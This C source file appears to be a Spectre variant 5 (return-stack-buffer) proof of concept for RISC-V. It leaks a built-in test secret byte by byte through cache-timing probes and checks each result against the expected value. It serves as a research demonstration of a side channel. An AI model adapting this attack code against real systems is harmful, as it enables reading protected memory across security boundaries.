#include <stdio.h>
#include <stdint.h>
#include <string.h>

#include "rv64_spectre.h"

#ifndef V5_ROUNDS
#define V5_ROUNDS 64
#endif

#ifndef V5_TRAIN_PASSES
#define V5_TRAIN_PASSES 8
#endif

#ifndef V5_RAS_DEPTH
#define V5_RAS_DEPTH 48
#endif

#ifndef V5_IN_PLACE_DELAY
#define V5_IN_PLACE_DELAY 128
#endif

static uint8_t *attack_array;
static const char secret[] = "S3CreT";
static volatile uint64_t leak_guard;

static __attribute__((noinline)) void in_place(uint64_t delay_cycles)
{
  const uint64_t start = rdcycle();
  while (rdcycle() - start < delay_cycles)
    asm volatile("nop");
}

static __attribute__((noinline)) void leak_site(char *addr, uint64_t delay)
{
  in_place(delay);
  probe_encode(attack_array, (uint8_t)*addr);
  leak_guard += (uint8_t)*addr;
}

static __attribute__((noinline)) void benign_site(char *addr, uint64_t delay)
{
  in_place(delay);
  leak_guard ^= (uintptr_t)addr;
}

static __attribute__((noinline)) void recurse_train(size_t depth, char *addr, uint64_t delay,
                                                    int leak)
{
  if (depth == 0)
  {
    if (leak)
      leak_site(addr, delay);
    else
      benign_site(addr, delay);
    return;
  }

  recurse_train(depth - 1, addr, delay, leak);
  asm volatile("" ::: "memory");
}

static __attribute__((noinline)) void read_byte(char *addr, uint8_t result[2],
                                                uint64_t score[2], uint64_t threshold)
{
  uint64_t hits[PROBE_ENTRIES];
  memset(hits, 0, sizeof(hits));

  for (int round = V5_ROUNDS; round > 0; --round)
  {
    flush_range(attack_array, PROBE_BYTES);

    for (int train = 0; train < V5_TRAIN_PASSES; ++train)
      recurse_train(V5_RAS_DEPTH, addr, V5_IN_PLACE_DELAY, 1);

    flush_range(attack_array, PROBE_BYTES);
    recurse_train(V5_RAS_DEPTH + 1u, addr, V5_IN_PLACE_DELAY, 0);

    for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    {
      const size_t mix_i = probe_mix(i);
      volatile uint8_t *probe = &attack_array[mix_i * PROBE_STRIDE];
      const uint64_t elapsed = probe_time(probe);
      if (elapsed <= threshold)
        hits[mix_i]++;
    }
  }

  top_two_idx(hits, PROBE_ENTRIES, result, score);
}

int main(void)
{
  uint8_t result[2] = {0, 0};
  uint64_t score[2] = {0, 0};
  const size_t len = spectre_limit_len(sizeof(secret) - 1u);

  if (spectre_runtime_init() != 0)
    return 1;
  attack_array = (uint8_t *)spectre_alloc_aligned(PROBE_BYTES, L1_BLOCK_SZ_BYTES);
  if (attack_array == NULL)
    return 1;

  probe_init(attack_array);
  const uint64_t threshold = calibrate_probe_threshold(attack_array);

  printf("[v5] threshold: %lu\n", (unsigned long)threshold);
  printf("[v5] reading %lu bytes\n", (unsigned long)len);

  for (size_t i = 0; i < len; ++i)
  {
    read_byte((char *)secret + i, result, score, threshold);
    printf("[v5] byte %2lu: %c (0x%02x) score=%lu\n",
           (unsigned long)i,
           (result[0] >= 32 && result[0] < 127) ? result[0] : '?',
           result[0],
           (unsigned long)score[0]);
    printf("[v5] expected: %c (0x%02x) second=%c (0x%02x) score=%lu\n",
           (secret[i] >= 32 && secret[i] < 127) ? secret[i] : '?',
           (uint8_t)secret[i],
           (result[1] >= 32 && result[1] < 127) ? result[1] : '?',
           result[1],
           (unsigned long)score[1]);
    printf("[v5] check %lu 0x%02x 0x%02x\n",
           (unsigned long)i,
           result[0],
           (uint8_t)secret[i]);
  }

  printf("[v5] leak_guard=%lu\n", (unsigned long)leak_guard);
  return 0;
}
